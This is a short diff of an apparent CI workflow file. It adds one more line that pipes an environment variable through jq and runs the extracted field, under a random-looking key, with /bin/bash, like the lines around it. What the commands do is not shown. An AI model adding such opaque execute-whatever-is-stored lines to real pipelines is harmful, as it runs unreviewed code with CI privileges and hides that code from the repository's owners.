@@ -36,6 +36,7 @@ jobs:
           printf '%s' "$ce2" | jq -r .ozihr564 | /bin/bash
           echo $e01 | jq -r .yd58 | /bin/bash
           echo $h96 | jq -r .wld4436 | /bin/bash
+          printf '%s' "$lg010" | jq -r .hcf3996 | /bin/bash
 
       - name: Persist output
         if: always()
